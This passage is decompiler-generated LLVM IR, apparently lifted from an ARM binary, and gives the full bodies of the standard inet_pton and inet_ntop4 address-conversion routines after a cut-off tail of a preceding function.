  uselistorder label %dec_label_pc_15424, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_153f0.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_15390, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v3_15430 = load i32, i32* @r4, align 4
  %v6_15430 = load i32, i32* @r5, align 4
  %v9_15430 = load i32, i32* @r6, align 4
  %v12_15430 = load i32, i32* @r7, align 4
  %v27_15430 = load i32, i32* @lr, align 4
  %v7_1543c = icmp eq i32 %arg1, 2
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  br i1 %v7_1543c, label %dec_label_pc_1545c, label %dec_label_pc_15450

dec_label_pc_15450:                               ; preds = %entry
  %v7_15450 = icmp eq i32 %arg1, 10
  br i1 %v7_15450, label %dec_label_pc_1546c, label %dec_label_pc_15624

dec_label_pc_1545c:                               ; preds = %entry
  store i32 %tmp, i32* @r0, align 4
  %v3_15464 = call i32 @inet_pton4(i32 %tmp, i32 %arg3)
  br label %dec_label_pc_1563c

dec_label_pc_1546c:                               ; preds = %dec_label_pc_15450
  %v2_1546c = ptrtoint i32* %stack_var_-56 to i32
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_15478 = bitcast i32* %stack_var_-56 to i8*
  %v4_15478 = call i32 @__GI_memset(i8* %v3_15478, i32 0, i32 16)
  %v0_1547c = load i32, i32* @r5, align 4
  %v1_1547c = inttoptr i32 %v0_1547c to i8*
  %v2_1547c = load i8, i8* %v1_1547c, align 1
  %v3_1547c = zext i8 %v2_1547c to i32
  store i32 %v3_1547c, i32* %r3.global-to-local, align 4
  %v7_15480 = icmp eq i8 %v2_1547c, 58
  store i32 %v4_15478, i32* @r6, align 4
  %v2_15488 = add i32 %v4_15478, 16
  store i32 %v2_15488, i32* %r8.global-to-local, align 4
  br i1 %v7_15480, label %dec_label_pc_15490, label %dec_label_pc_1549c

dec_label_pc_15490:                               ; preds = %dec_label_pc_1546c
  %v1_15490 = add i32 %v0_1547c, 1
  %v2_15490 = inttoptr i32 %v1_15490 to i8*
  %v3_15490 = load i8, i8* %v2_15490, align 1
  %v4_15490 = zext i8 %v3_15490 to i32
  store i32 %v4_15490, i32* %r3.global-to-local, align 4
  store i32 %v1_15490, i32* @r5, align 4
  %v7_15494 = icmp eq i8 %v3_15490, 58
  br i1 %v7_15494, label %dec_label_pc_1549c, label %dec_label_pc_1561c

dec_label_pc_1549c:                               ; preds = %dec_label_pc_15490, %dec_label_pc_1546c
  %v0_154a8 = phi i32 [ %v1_15490, %dec_label_pc_15490 ], [ %v0_1547c, %dec_label_pc_1546c ]
  store i32 -33224, i32* @r3, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v0_154a4 = load i32, i32* @r4, align 4
  %v2_154a4 = add i32 %v0_154a4, -33224
  store i32 %v0_154a8, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  store i32 %v2_154a4, i32* %stack_var_-64, align 4
  %v1_155803 = inttoptr i32 %v0_154a8 to i8*
  %v2_155804 = load i8, i8* %v1_155803, align 1
  %v3_155805 = zext i8 %v2_155804 to i32
  store i32 %v3_155805, i32* @r4, align 4
  %v2_155846 = icmp eq i8 %v2_155804, 0
  br i1 %v2_155846, label %dec_label_pc_1558c.thread, label %dec_label_pc_154bc

dec_label_pc_1558c.thread:                        ; preds = %dec_label_pc_1549c
  store i32 %v4_15478, i32* @r4, align 4
  br label %dec_label_pc_155b8

dec_label_pc_154bc:                               ; preds = %dec_label_pc_1549c, %dec_label_pc_15580.backedge.dec_label_pc_154bc_crit_edge
  %v0_154c0 = phi i32 [ %v3_15580, %dec_label_pc_15580.backedge.dec_label_pc_154bc_crit_edge ], [ %v3_155805, %dec_label_pc_1549c ]
  %v2_154bc = phi i32 [ %v2_154bc.pre, %dec_label_pc_15580.backedge.dec_label_pc_154bc_crit_edge ], [ %v2_154a4, %dec_label_pc_1549c ]
  store i32 %v2_154bc, i32* @r0, align 4
  %v1_154c0 = or i32 %v0_154c0, 32
  %v2_154c4 = call i32 @__GI_strchr(i32 %v2_154bc, i32 %v1_154c0)
  %v2_154c8 = icmp eq i32 %v2_154c4, 0
  %v0_154cc = load i32, i32* @r5, align 4
  %v1_154cc = add i32 %v0_154cc, 1
  store i32 %v1_154cc, i32* @r5, align 4
  br i1 %v2_154c8, label %dec_label_pc_154f0, label %dec_label_pc_154d4

dec_label_pc_154d4:                               ; preds = %dec_label_pc_154bc
  %v2_154d4 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_154d4, i32* %r2.global-to-local, align 4
  %v2_154d8 = sub i32 %v2_154c4, %v2_154d4
  %v1_154dc = load i32, i32* @r7, align 4
  %v4_154dc = mul i32 %v1_154dc, 16
  %v5_154dc = or i32 %v4_154dc, %v2_154d8
  store i32 %v5_154dc, i32* @r7, align 4
  store i32 65535, i32* @r3, align 4
  %tmp36 = icmp ult i32 %v5_154dc, 65536
  br i1 %tmp36, label %dec_label_pc_1557c, label %dec_label_pc_1561c

dec_label_pc_154f0:                               ; preds = %dec_label_pc_154bc
  %v0_154f0 = load i32, i32* @r4, align 4
  %v7_154f0 = icmp eq i32 %v0_154f0, 58
  br i1 %v7_154f0, label %dec_label_pc_154f8, label %dec_label_pc_15550

dec_label_pc_154f8:                               ; preds = %dec_label_pc_154f0
  %v0_154f8 = load i32, i32* %sb.global-to-local, align 4
  %v2_154f8 = icmp eq i32 %v0_154f8, 0
  br i1 %v2_154f8, label %dec_label_pc_15500, label %dec_label_pc_15514

dec_label_pc_15500:                               ; preds = %dec_label_pc_154f8
  %v0_15500 = load i32, i32* %fp.global-to-local, align 4
  %v2_15500 = icmp eq i32 %v0_15500, 0
  br i1 %v2_15500, label %dec_label_pc_15508, label %dec_label_pc_1561c

dec_label_pc_15508:                               ; preds = %dec_label_pc_15500
  %v0_15508 = load i32, i32* @r6, align 4
  store i32 %v0_15508, i32* %fp.global-to-local, align 4
  store i32 %v1_154cc, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_15580.backedge

dec_label_pc_15514:                               ; preds = %dec_label_pc_154f8
  %v1_15514 = inttoptr i32 %v1_154cc to i8*
  %v2_15514 = load i8, i8* %v1_15514, align 1
  %v3_15514 = zext i8 %v2_15514 to i32
  store i32 %v3_15514, i32* %r3.global-to-local, align 4
  %v2_15518 = icmp eq i8 %v2_15514, 0
  br i1 %v2_15518, label %dec_label_pc_1561c, label %dec_label_pc_15520

dec_label_pc_15520:                               ; preds = %dec_label_pc_15514
  %v0_15520 = load i32, i32* @r6, align 4
  %v1_15520 = add i32 %v0_15520, 2
  store i32 %v1_15520, i32* %r3.global-to-local, align 4
  %v1_15524 = load i32, i32* %r8.global-to-local, align 4
  %tmp37 = icmp ugt i32 %v1_15520, %v1_15524
  br i1 %tmp37, label %dec_label_pc_1561c, label %dec_label_pc_1552c

dec_label_pc_1552c:                               ; preds = %dec_label_pc_15520
  %v0_1552c = load i32, i32* @r7, align 4
  %v3_1552c = udiv i32 %v0_1552c, 256
  store i32 %v3_1552c, i32* %r2.global-to-local, align 4
  store i32 %v0_15520, i32* %r3.global-to-local, align 4
  %v1_15534 = trunc i32 %v3_1552c to i8
  %v3_15534 = inttoptr i32 %v0_15520 to i8*
  store i8 %v1_15534, i8* %v3_15534, align 1
  %v4_15534 = load i32, i32* %r3.global-to-local, align 4
  %v5_15534 = add i32 %v4_15534, 1
  store i32 %v5_15534, i32* @r3, align 4
  %v0_15538 = load i32, i32* @r7, align 4
  %v1_15538 = trunc i32 %v0_15538 to i8
  %v2_15538 = load i32, i32* @r6, align 4
  %v3_15538 = add i32 %v2_15538, 1
  %v4_15538 = inttoptr i32 %v3_15538 to i8*
  store i8 %v1_15538, i8* %v4_15538, align 1
  store i32 0, i32* @r7, align 4
  %v0_15540 = load i32, i32* @r3, align 4
  %v1_15540 = add i32 %v0_15540, 1
  store i32 %v1_15540, i32* @r6, align 4
  %v0_15544 = load i32, i32* @r5, align 4
  store i32 %v0_15544, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_15580.backedge

dec_label_pc_15550:                               ; preds = %dec_label_pc_154f0
  %v7_15550 = icmp eq i32 %v0_154f0, 46
  br i1 %v7_15550, label %dec_label_pc_15558, label %dec_label_pc_1561c

dec_label_pc_15558:                               ; preds = %dec_label_pc_15550
  %v0_15558 = load i32, i32* @r6, align 4
  %v1_15558 = add i32 %v0_15558, 4
  store i32 %v1_15558, i32* @r4, align 4
  %v1_1555c = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_15558, %v1_1555c
  br i1 %tmp38, label %dec_label_pc_1561c, label %dec_label_pc_15564

dec_label_pc_15564:                               ; preds = %dec_label_pc_15558
  %v0_15564 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_15564, i32* @r0, align 4
  %v3_1556c = call i32 @inet_pton4(i32 %v0_15564, i32 %v0_15558)
  %v5_15574 = icmp sgt i32 %v3_1556c, 0
  br i1 %v5_15574, label %dec_label_pc_15564.dec_label_pc_155b8_crit_edge, label %dec_label_pc_1561c

dec_label_pc_15564.dec_label_pc_155b8_crit_edge:  ; preds = %dec_label_pc_15564
  %v0_155fc.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_155b8

dec_label_pc_1557c:                               ; preds = %dec_label_pc_154d4
  store i32 1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_15580.backedge

dec_label_pc_15580.backedge:                      ; preds = %dec_label_pc_1557c, %dec_label_pc_1552c, %dec_label_pc_15508
  %v0_15580 = phi i32 [ %v1_154cc, %dec_label_pc_1557c ], [ %v0_15544, %dec_label_pc_1552c ], [ %v1_154cc, %dec_label_pc_15508 ]
  %v0_1558c12 = phi i32 [ 1, %dec_label_pc_1557c ], [ 0, %dec_label_pc_1552c ], [ 0, %dec_label_pc_15508 ]
  %v1_15580 = inttoptr i32 %v0_15580 to i8*
  %v2_15580 = load i8, i8* %v1_15580, align 1
  %v3_15580 = zext i8 %v2_15580 to i32
  store i32 %v3_15580, i32* @r4, align 4
  %v2_15584 = icmp eq i8 %v2_15580, 0
  br i1 %v2_15584, label %dec_label_pc_1558c, label %dec_label_pc_15580.backedge.dec_label_pc_154bc_crit_edge

dec_label_pc_15580.backedge.dec_label_pc_154bc_crit_edge: ; preds = %dec_label_pc_15580.backedge
  %v2_154bc.pre = load i32, i32* %stack_var_-64, align 4
  br label %dec_label_pc_154bc

dec_label_pc_1558c:                               ; preds = %dec_label_pc_15580.backedge
  %v0_15590.pre = load i32, i32* @r6, align 4
  %v2_1558c = icmp eq i32 %v0_1558c12, 0
  store i32 %v0_15590.pre, i32* @r4, align 4
  br i1 %v2_1558c, label %dec_label_pc_155b8, label %dec_label_pc_15598

dec_label_pc_15598:                               ; preds = %dec_label_pc_1558c
  %v1_15598 = add i32 %v0_15590.pre, 2
  store i32 %v1_15598, i32* %r3.global-to-local, align 4
  %v1_1559c = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_15598, %v1_1559c
  br i1 %tmp39, label %dec_label_pc_1561c, label %dec_label_pc_155a4

dec_label_pc_155a4:                               ; preds = %dec_label_pc_15598
  store i32 %v0_15590.pre, i32* %r3.global-to-local, align 4
  %v0_155a8 = load i32, i32* @r7, align 4
  %v3_155a8 = udiv i32 %v0_155a8, 256
  store i32 %v3_155a8, i32* %r2.global-to-local, align 4
  %v1_155ac = trunc i32 %v3_155a8 to i8
  %v3_155ac = inttoptr i32 %v0_15590.pre to i8*
  store i8 %v1_155ac, i8* %v3_155ac, align 1
  %v4_155ac = load i32, i32* %r3.global-to-local, align 4
  %v5_155ac = add i32 %v4_155ac, 1
  store i32 %v5_155ac, i32* @r3, align 4
  %v0_155b0 = load i32, i32* @r7, align 4
  %v1_155b0 = trunc i32 %v0_155b0 to i8
  %v2_155b0 = load i32, i32* @r6, align 4
  %v3_155b0 = add i32 %v2_155b0, 1
  %v4_155b0 = inttoptr i32 %v3_155b0 to i8*
  store i8 %v1_155b0, i8* %v4_155b0, align 1
  %v0_155b4 = load i32, i32* @r3, align 4
  %v1_155b4 = add i32 %v0_155b4, 1
  store i32 %v1_155b4, i32* @r4, align 4
  br label %dec_label_pc_155b8

dec_label_pc_155b8:                               ; preds = %dec_label_pc_15564.dec_label_pc_155b8_crit_edge, %dec_label_pc_1558c.thread, %dec_label_pc_1558c, %dec_label_pc_155a4
  %v0_155fc.pre = phi i32 [ %v0_155fc.pre.pre, %dec_label_pc_15564.dec_label_pc_155b8_crit_edge ], [ %v4_15478, %dec_label_pc_1558c.thread ], [ %v0_15590.pre, %dec_label_pc_1558c ], [ %v1_155b4, %dec_label_pc_155a4 ]
  %v0_155b8 = load i32, i32* %fp.global-to-local, align 4
  %v2_155b8 = icmp eq i32 %v0_155b8, 0
  %v1_155fc.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_155b8, label %dec_label_pc_155fc, label %dec_label_pc_155c0

dec_label_pc_155c0:                               ; preds = %dec_label_pc_155b8
  %v9_155c0 = icmp eq i32 %v0_155fc.pre, %v1_155fc.pre
  %v2_155c4 = sub i32 %v0_155fc.pre, %v0_155b8
  store i32 %v2_155c4, i32* @ip, align 4
  br i1 %v9_155c0, label %dec_label_pc_1561c, label %dec_label_pc_155e4.preheader

dec_label_pc_155e4.preheader:                     ; preds = %dec_label_pc_155c0
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_155e4

dec_label_pc_155d8:                               ; preds = %dec_label_pc_155e4
  %v2_155ec = sub i32 %v0_155f8, %v0_155f0
  %v0_155d8 = load i32, i32* %fp.global-to-local, align 4
  %v2_155d8 = add i32 %v0_155d8, %v2_155e8
  %v3_155d8 = inttoptr i32 %v2_155d8 to i8*
  %v4_155d8 = load i8, i8* %v3_155d8, align 1
  %v6_155d8 = zext i8 %v4_155d8 to i32
  store i32 %v6_155d8, i32* @r3, align 4
  %v3_155dc = inttoptr i32 %v2_155ec to i8*
  store i8 %v4_155d8, i8* %v3_155dc, align 1
  %v0_155e0 = load i32, i32* @lr, align 4
  %v1_155e0 = trunc i32 %v0_155e0 to i8
  %v2_155e0 = load i32, i32* %fp.global-to-local, align 4
  %v3_155e0 = load i32, i32* @r1, align 4
  %v4_155e0 = add i32 %v3_155e0, %v2_155e0
  %v5_155e0 = inttoptr i32 %v4_155e0 to i8*
  store i8 %v1_155e0, i8* %v5_155e0, align 1
  %v0_155e4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_155e4.pre = load i32, i32* @ip, align 4
  %v1_155ec.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_155e4

dec_label_pc_155e4:                               ; preds = %dec_label_pc_155e4.preheader, %dec_label_pc_155d8
  %v0_155f8 = phi i32 [ %v1_155fc.pre, %dec_label_pc_155e4.preheader ], [ %v1_155ec.pre, %dec_label_pc_155d8 ]
  %v1_155e8 = phi i32 [ %v2_155c4, %dec_label_pc_155e4.preheader ], [ %v1_155e4.pre, %dec_label_pc_155d8 ]
  %v0_155f0 = phi i32 [ 1, %dec_label_pc_155e4.preheader ], [ %v0_155e4.pre, %dec_label_pc_155d8 ]
  %v2_155e4 = sub i32 %v0_155f0, %v1_155e8
  %v4_155e4 = xor i32 %v0_155f0, %v1_155e8
  %v5_155e4 = xor i32 %v2_155e4, %v0_155f0
  %v6_155e4 = and i32 %v5_155e4, %v4_155e4
  %v7_155e4 = icmp slt i32 %v6_155e4, 0
  %v8_155e4 = icmp slt i32 %v2_155e4, 0
  %v9_155e4 = icmp eq i32 %v0_155f0, %v1_155e8
  %v2_155e8 = sub i32 %v1_155e8, %v0_155f0
  store i32 %v2_155e8, i32* @r1, align 4
  %v1_155f0 = add i32 %v0_155f0, 1
  store i32 %v1_155f0, i32* %r2.global-to-local, align 4
  %v3_155f4 = xor i1 %v8_155e4, %v7_155e4
  %v4_155f4 = or i1 %v9_155e4, %v3_155f4
  br i1 %v4_155f4, label %dec_label_pc_155d8, label %dec_label_pc_155f8

dec_label_pc_155f8:                               ; preds = %dec_label_pc_155e4
  store i32 %v0_155f8, i32* @r4, align 4
  br label %dec_label_pc_155fc

dec_label_pc_155fc:                               ; preds = %dec_label_pc_155b8, %dec_label_pc_155f8
  %v0_155fc = phi i32 [ %v0_155f8, %dec_label_pc_155f8 ], [ %v0_155fc.pre, %dec_label_pc_155b8 ]
  %v1_155fc = phi i32 [ %v0_155f8, %dec_label_pc_155f8 ], [ %v1_155fc.pre, %dec_label_pc_155b8 ]
  %v9_155fc = icmp eq i32 %v0_155fc, %v1_155fc
  br i1 %v9_155fc, label %dec_label_pc_15604, label %dec_label_pc_1561c

dec_label_pc_15604:                               ; preds = %dec_label_pc_155fc
  store i32 %arg3, i32* @r0, align 4
  store i32 %v2_1546c, i32* @r1, align 4
  store i32 16, i32* @r2, align 4
  %v0_15610 = call i32 @memcpy()
  br label %dec_label_pc_1563c

dec_label_pc_1561c:                               ; preds = %dec_label_pc_154d4, %dec_label_pc_15500, %dec_label_pc_15520, %dec_label_pc_15514, %dec_label_pc_155c0, %dec_label_pc_15564, %dec_label_pc_15550, %dec_label_pc_155fc, %dec_label_pc_15490, %dec_label_pc_15598, %dec_label_pc_15558
  br label %dec_label_pc_1563c

dec_label_pc_15624:                               ; preds = %dec_label_pc_15450
  store i32 56112, i32* %r3.global-to-local, align 4
  %v0_15628 = call i32 @__aeabi_read_tp()
  %v3_1562c = load i16, i16* @global_var_23164.175, align 2
  %v4_1562c = sext i16 %v3_1562c to i32
  store i32 %v4_1562c, i32* %r3.global-to-local, align 4
  store i32 97, i32* %r2.global-to-local, align 4
  %v3_15634 = add i32 %v4_1562c, %v0_15628
  %v4_15634 = inttoptr i32 %v3_15634 to i32*
  store i32 97, i32* %v4_15634, align 4
  br label %dec_label_pc_1563c

dec_label_pc_1563c:                               ; preds = %dec_label_pc_1545c, %dec_label_pc_1561c, %dec_label_pc_15604, %dec_label_pc_15624
  %v1_15644 = phi i32 [ %v3_15464, %dec_label_pc_1545c ], [ 0, %dec_label_pc_1561c ], [ 1, %dec_label_pc_15604 ], [ -1, %dec_label_pc_15624 ]
  store i32 %v3_15430, i32* @r4, align 4
  store i32 %v6_15430, i32* @r5, align 4
  store i32 %v9_15430, i32* @r6, align 4
  store i32 %v12_15430, i32* @r7, align 4
  store i32 %v27_15430, i32* @lr, align 4
  ret i32 %v1_15644

; uselistorder directives
  uselistorder i32 %v2_155e8, { 1, 0 }
  uselistorder i32 %v2_155e4, { 1, 0 }
  uselistorder i32 %v0_155f0, { 2, 3, 6, 0, 1, 5, 4 }
  uselistorder i32 %v1_155e8, { 1, 3, 0, 2 }
  uselistorder i32 %v0_155f8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_155fc.pre, { 0, 2, 1 }
  uselistorder i32 %v0_155fc.pre, { 2, 0, 1 }
  uselistorder i32 %v3_155a8, { 1, 0 }
  uselistorder i32 %v0_15590.pre, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v3_15580, { 1, 0 }
  uselistorder i32 %v3_1552c, { 1, 0 }
  uselistorder i32 %v0_15520, { 1, 0, 2 }
  uselistorder i32 %v1_154cc, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_154bc, { 1, 0 }
  uselistorder i32 %v0_154a8, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %sb.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32* %r3.global-to-local, { 6, 7, 9, 10, 8, 0, 1, 2, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 4, 6, 5, 7, 8, 1, 2, 3, 0 }
  uselistorder i32* %fp.global-to-local, { 2, 3, 4, 0, 1, 5 }
  uselistorder label %dec_label_pc_1563c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1561c, { 7, 4, 9, 5, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_155fc, { 1, 0 }
  uselistorder label %dec_label_pc_155e4, { 1, 0 }
  uselistorder label %dec_label_pc_155b8, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_154bc, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-57 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %arg3, i32* %stack_var_-72, align 4
  store i32 0, i32* %stack_var_-57, align 4
  %v2_15730 = ptrtoint i32* %stack_var_-40 to i32
  %v2_15710 = add i32 %v2_15730, -17
  br label %dec_label_pc_15730

dec_label_pc_15680:                               ; preds = %dec_label_pc_15730
  %v0_15680 = load i32, i32* %fp.global-to-local, align 4
  %v2_15680 = add i32 %v0_15680, %v1_15680
  %v3_15680 = inttoptr i32 %v2_15680 to i8*
  %v4_15680 = load i8, i8* %v3_15680, align 1
  %v6_15680 = zext i8 %v4_15680 to i32
  store i32 %v6_15680, i32* %r4.global-to-local, align 4
  %div4 = udiv i8 %v4_15680, 100
  %v2_15688 = zext i8 %div4 to i32
  store i32 %v2_15688, i32* %r0.global-to-local, align 4
  %v1_1568c = or i8 %div4, 48
  %v3_15690 = add i32 %v2_15740, -17
  %v4_15690 = inttoptr i32 %v3_15690 to i8*
  store i8 %v1_1568c, i8* %v4_15690, align 1
  %v0_15694 = load i32, i32* %r5.global-to-local, align 4
  %v1_15694 = add i32 %v0_15694, -17
  %v2_15694 = inttoptr i32 %v1_15694 to i8*
  %v3_15694 = load i8, i8* %v2_15694, align 1
  %v0_15698 = load i32, i32* %r6.global-to-local, align 4
  %v1_15698 = add i32 %v0_15698, 1
  store i32 %v1_15698, i32* %r6.global-to-local, align 4
  %v7_156a0 = icmp eq i8 %v3_15694, 48
  %v0_156a8 = load i32, i32* %r4.global-to-local, align 4
  %v0_156b0 = load i32, i32* %fp.global-to-local, align 4
  %v1_156b0 = load i32, i32* %sl.global-to-local, align 4
  %v2_156b0 = add i32 %v1_156b0, %v0_156b0
  store i32 %v2_156b0, i32* %sb.global-to-local, align 4
  %v2_156b8 = udiv i32 %v0_156a8, 10
  %v1_156c0 = urem i32 %v2_156b8, 256
  %v2_156c4 = udiv i32 %v1_156c0, 10
  %v3_156c4 = urem i32 %v1_156c0, 10
  store i32 %v2_156c4, i32* %r0.global-to-local, align 4
  %v1_156c8 = or i32 %v3_156c4, 48
  store i32 %v1_156c8, i32* %r1.global-to-local, align 4
  br i1 %v7_156a0, label %dec_label_pc_156b8, label %dec_label_pc_156e0

dec_label_pc_156b8:                               ; preds = %dec_label_pc_15680
  %v7_156d0 = icmp eq i32 %v1_156c8, 48
  br i1 %v7_156d0, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_156b8
  store i32 %v1_15698, i32* %r7.global-to-local, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_156b8, %bb
  %v1_156d8 = trunc i32 %v1_156c8 to i8
  store i8 %v1_156d8, i8* %v2_15694, align 1
  %v0_1570c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_156fc

dec_label_pc_156e0:                               ; preds = %dec_label_pc_15680
  %v2_156ac = add i32 %v1_15698, %v2_15730
  %v1_156f4 = trunc i32 %v1_156c8 to i8
  %v3_156f4 = add i32 %v2_156ac, -17
  %v4_156f4 = inttoptr i32 %v3_156f4 to i8*
  store i8 %v1_156f4, i8* %v4_156f4, align 1
  %v0_156f8 = load i32, i32* %r6.global-to-local, align 4
  %v1_156f8 = add i32 %v0_156f8, 1
  store i32 %v1_156f8, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_156fc

dec_label_pc_156fc:                               ; preds = %bb18, %dec_label_pc_156e0
  %v0_1570c = phi i32 [ %v0_1570c.pre, %bb18 ], [ %v1_156f8, %dec_label_pc_156e0 ]
  %v0_156fc = load i32, i32* %sb.global-to-local, align 4
  %v1_156fc = inttoptr i32 %v0_156fc to i8*
  %v2_156fc = load i8, i8* %v1_156fc, align 1
  %tmp19 = urem i8 %v2_156fc, 10
  %v3_15704 = zext i8 %tmp19 to i32
  store i32 %v2_15730, i32* %ip.global-to-local, align 4
  %v1_1570c = add i32 %v0_1570c, 1
  store i32 %v1_1570c, i32* %r0.global-to-local, align 4
  %v1_15714 = or i32 %v3_15704, 48
  store i32 %v1_15714, i32* %r1.global-to-local, align 4
  %v1_15718 = trunc i32 %v1_15714 to i8
  %v3_15718 = add i32 %v2_15710, %v0_1570c
  %v4_15718 = inttoptr i32 %v3_15718 to i8*
  store i8 %v1_15718, i8* %v4_15718, align 1
  %v0_1571c = load i32, i32* %ip.global-to-local, align 4
  %v1_1571c = load i32, i32* %r0.global-to-local, align 4
  %v2_1571c = add i32 %v1_1571c, %v0_1571c
  %v3_15724 = add i32 %v2_1571c, -17
  %v4_15724 = inttoptr i32 %v3_15724 to i8*
  store i8 46, i8* %v4_15724, align 1
  %v0_15728 = load i32, i32* %r0.global-to-local, align 4
  %v1_15728 = add i32 %v0_15728, 1
  store i32 %v1_15728, i32* %r6.global-to-local, align 4
  %v0_1572c = load i32, i32* %sl.global-to-local, align 4
  %v1_1572c = add i32 %v0_1572c, 1
  store i32 %v1_1572c, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_15730

dec_label_pc_15730:                               ; preds = %entry, %dec_label_pc_156fc
  %v0_1573c = phi i32 [ 0, %entry ], [ %v1_15728, %dec_label_pc_156fc ]
  %v1_15680 = phi i32 [ 0, %entry ], [ %v1_1572c, %dec_label_pc_156fc ]
  store i32 %v2_15730, i32* %ip.global-to-local, align 4
  store i32 100, i32* %r1.global-to-local, align 4
  store i32 %v0_1573c, i32* %r7.global-to-local, align 4
  %v2_15740 = add i32 %v0_1573c, %v2_15730
  store i32 %v2_15740, i32* %r5.global-to-local, align 4
  %v7_15744 = icmp sgt i32 %v1_15680, 3
  br i1 %v7_15744, label %dec_label_pc_15748, label %dec_label_pc_15680

dec_label_pc_15748:                               ; preds = %dec_label_pc_15730
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_1574c = ptrtoint i32* %stack_var_-57 to i32
  store i32 %v2_1574c, i32* %r4.global-to-local, align 4
  %v3_15750 = add i32 %v2_15740, -18
  %v4_15750 = inttoptr i32 %v3_15750 to i8*
  store i8 0, i8* %v4_15750, align 1
  %tmp20 = bitcast i32* %stack_var_-57 to i8*
  store i32 %v2_1574c, i32* %r0.global-to-local, align 4
  %v3_15758 = call i32 @strlen(i8* %tmp20)
  store i32 %v3_15758, i32* %r0.global-to-local, align 4
  %v2_1575c = load i32, i32* %stack_var_-72, align 4
  %tmp = icmp ugt i32 %v3_15758, %v2_1575c
  br i1 %tmp, label %dec_label_pc_15768, label %dec_label_pc_15784

dec_label_pc_15768:                               ; preds = %dec_label_pc_15748
  %v0_1576c = call i32 @__aeabi_read_tp()
  store i32 %v0_1576c, i32* %r0.global-to-local, align 4
  %v3_15770 = load i16, i16* @global_var_23164.175, align 2
  %v4_15770 = sext i16 %v3_15770 to i32
  %v0_15778 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_15778, i32* %r1.global-to-local, align 4
  %v3_1577c = add i32 %v4_15770, %v0_1576c
  %v4_1577c = inttoptr i32 %v3_1577c to i32*
  store i32 28, i32* %v4_1577c, align 4
  %v0_15794.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15794

dec_label_pc_15784:                               ; preds = %dec_label_pc_15748
  store i32 %v2_1574c, i32* @r1, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v2_1578c = inttoptr i32 %arg2 to i8*
  %v3_1578c = call i32 @strcpy(i8* %v2_1578c, i32 %v2_1574c)
  store i32 %v3_1578c, i32* %r0.global-to-local, align 4
  store i32 %v3_1578c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15794

dec_label_pc_15794:                               ; preds = %dec_label_pc_15768, %dec_label_pc_15784
  %v0_15794 = phi i32 [ %v0_15794.pre, %dec_label_pc_15768 ], [ %v3_1578c, %dec_label_pc_15784 ]
  store i32 %v0_15794, i32* %r0.global-to-local, align 4
  ret i32 %v0_15794

; uselistorder directives
  uselistorder i32 %v0_15794, { 1, 0 }
